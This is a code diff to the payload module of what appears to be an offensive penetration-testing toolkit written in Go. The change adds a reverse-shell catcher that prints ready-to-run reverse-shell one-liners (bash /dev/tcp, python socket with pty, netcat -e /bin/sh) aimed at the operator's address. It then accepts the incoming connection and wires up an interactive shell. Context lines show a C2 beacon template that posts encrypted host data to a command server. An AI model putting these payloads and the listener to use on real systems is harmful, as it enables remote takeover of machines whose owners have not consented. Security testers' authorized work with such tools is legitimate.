@@ -2,13 +2,16 @@ package payloads
 
 import (
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"os/exec"
 	"strings"
 	"time"
 
+	"github.com/bryanparreira/davoid/internal/engagement"
 	"github.com/bryanparreira/davoid/internal/modules/ui"
+	"github.com/bryanparreira/davoid/internal/notify"
 )
 
 type shellTemplate struct {
@@ -72,7 +75,6 @@ func main() {
 		enc, _ := aesEncrypt(data)
 		resp, err := http.Post(C2+"/beacon", "text/plain", bytes.NewReader([]byte(enc)))
 		if err == nil {
-			// ... handle response
 			resp.Body.Close()
 		}
 		time.Sleep(5 * time.Second)
@@ -80,7 +82,7 @@ func main() {
 }
 func hostname() string { h, _ := os.Hostname(); return h }
 func aesEncrypt(data []byte) (string, error) {
-	key := make([]byte, 32) // load from ghosthub.key
+	key := make([]byte, 32)
 	block, _ := aes.NewCipher(key)
 	gcm, _ := cipher.NewGCM(block)
 	nonce := make([]byte, gcm.NonceSize())
@@ -97,8 +99,99 @@ func run(cmd string) string {
 }
 
 func Run() error {
-	ui.Header("Shell Forge — Polymorphic Payload Generator")
+	ui.Header("Shell Forge — Payload Generator & Shell Catcher")
 
+	mode := ui.Select("Mode", []string{
+		"Generate Payload  (bash / python / PS / PHP / perl / go / msfvenom)",
+		"Catch Shell       (TCP listener — interactive reverse shell handler)",
+	})
+	switch mode {
+	case 0:
+		return runGenerate()
+	case 1:
+		return RunCatch()
+	}
+	return nil
+}
+
+// RunCatch is the standalone entry point used by runner key "catcher".
+func RunCatch() error {
+	lhost := getLocalIP()
+	port := ui.PromptDefault("Listen port", "4444")
+	multi := ui.Confirm("Stay open for multiple connections?")
+
+	fmt.Println()
+	ui.Success(fmt.Sprintf("Listening on %s:%s", lhost, port))
+	ui.Info("Drop one of these on the target:")
+	fmt.Println()
+	fmt.Printf("  bash    bash -i >& /dev/tcp/%s/%s 0>&1\n", lhost, port)
+	fmt.Printf("  python  python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'\n", lhost, port)
+	fmt.Printf("  nc      nc -e /bin/sh %s %s\n", lhost, port)
+	fmt.Println()
+	ui.Warn("Ctrl+C to cancel listener.")
+	ui.Divider()
+
+	for {
+		ln, err := net.Listen("tcp", ":"+port)
+		if err != nil {
+			ui.Fail(fmt.Sprintf("Cannot bind %s: %v", port, err))
+			return nil
+		}
+
+		conn, err := ln.Accept()
+		ln.Close()
+		if err != nil {
+			return nil
+		}
+
+		remoteAddr := conn.RemoteAddr().String()
+		ts := time.Now()
+		fmt.Println()
+		ui.Success(fmt.Sprintf("Shell from %s  [%s]", remoteAddr, ts.Format("15:04:05")))
+		fmt.Println()
+
+		eng, _ := engagement.Active()
+		if eng != nil {
+			engagement.LogFinding(eng.ID, "payloads", remoteAddr,
+				fmt.Sprintf("Reverse shell received from %s", remoteAddr),
+				fmt.Sprintf("Connected at %s", ts.Format(time.RFC3339)),
+				"CRITICAL", "")
+		}
+		notify.Fire(notify.EventShellConnect,
+			"Shell Connected",
+			fmt.Sprintf("Reverse shell from %s at %s", remoteAddr, ts.Format("15:04:05")))
+
+		handleShell(conn)
+		conn.Close()
+
+		fmt.Println()
+		ui.Warn("Connection closed.")
+
+		if !multi {
+			break
+		}
+		ui.Info(fmt.Sprintf("Listening again on %s:%s...", lhost, port))
+		ui.Divider()
+	}
+
+	ui.PressEnter()
+	return nil
+}
+
+func handleShell(conn net.Conn) {
+	done := make(chan struct{}, 2)
+	go func() {
+		io.Copy(conn, os.Stdin)
+		done <- struct{}{}
+	}()
+	go func() {
+		io.Copy(os.Stdout, conn)
+		done <- struct{}{}
+	}()
+	<-done
+}
+
+func runGenerate() error {
 	lhost := ui.PromptDefault("LHOST (your IP)", getLocalIP())
 	lport := ui.PromptDefault("LPORT", "4444")
 
@@ -117,7 +210,6 @@ func Run() error {
 	var ext string
 
 	if idx == len(templates) {
-		// msfvenom
 		payload, ext = generateMsfvenom(lhost, lport)
 	} else {
 		t := templates[idx]
@@ -139,13 +231,8 @@ func Run() error {
 	os.WriteFile(outFile, []byte(payload), 0700)
 	ui.Success(fmt.Sprintf("Saved to: %s", outFile))
 
-	if ui.Confirm("Start netcat listener now?") {
-		ui.Info(fmt.Sprintf("Listening on port %s (Ctrl+C to stop)...", lport))
-		cmd := exec.Command("nc", "-lvnp", lport)
-		cmd.Stdin = os.Stdin
-		cmd.Stdout = os.Stdout
-		cmd.Stderr = os.Stderr
-		cmd.Run()
+	if ui.Confirm("Start shell catcher now?") {
+		return RunCatch()
 	}
 
 	ui.PressEnter()
